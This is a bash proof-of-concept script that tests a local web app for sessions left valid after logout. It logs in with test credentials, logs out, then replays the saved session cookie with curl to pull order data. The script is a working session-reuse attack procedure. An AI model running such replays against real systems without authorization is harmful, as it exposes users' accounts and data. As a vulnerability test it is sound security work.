#!/bin/bash

# POC: Session Persistence After Logout
# This demonstrates that logged-out sessions can still be used to access the application

TARGET="http://localhost:8082"

echo "=== Session Persistence After Logout - POC ==="
echo ""

# Step 1: Login as test user
echo "[Step 1] Login as test user..."
curl -s -X POST "$TARGET/" -d "username=test" -c /tmp/poc_cookies.txt > /dev/null
curl -s -X POST "$TARGET/password/test" -d "username=test&user_id=10032&password=test" -b /tmp/poc_cookies.txt -c /tmp/poc_cookies.txt > /dev/null

# Extract session
SESSION=$(grep "session" /tmp/poc_cookies.txt | awk '{print $NF}')
echo "Obtained session: $SESSION"
echo ""

# Step 2: Verify access to orders BEFORE logout
echo "[Step 2] Accessing orders BEFORE logout..."
echo "GET $TARGET/orders"
response=$(curl -s "$TARGET/orders" -b /tmp/poc_cookies.txt)
if echo "$response" | grep -q "Orders"; then
    echo "✓ SUCCESS: Can access orders"
    echo "$response" | grep -E "Order|BUY|SELL" | head -3
else
    echo "✗ FAILED: Cannot access orders"
fi
echo ""

# Step 3: Logout
echo "[Step 3] Logout..."
echo "POST $TARGET/logout"
curl -s -X POST "$TARGET/logout" -b /tmp/poc_cookies.txt > /dev/null
echo "✓ Logout completed"
echo ""

# Step 4: Attempt to access orders with OLD session after logout
echo "[Step 4] VULNERABILITY TEST: Access orders with OLD session AFTER logout..."
echo "GET $TARGET/orders -H 'Cookie: session=$SESSION'"
response=$(curl -s "$TARGET/orders" -H "Cookie: session=$SESSION")
if echo "$response" | grep -q "Orders\|BUY\|SELL"; then
    echo "✗ VULNERABILITY FOUND:"
    echo "   - User is STILL able to access orders AFTER logout"
    echo "   - Session token was NOT invalidated on the server"
    echo "   - This allows session reuse attacks and privilege escalation"
    echo ""
    echo "[Order Data Retrieved]"
    echo "$response" | grep -E "<td>05/|<td>BUY|<td>SELL" | head -10
else
    echo "✓ Session properly invalidated"
fi
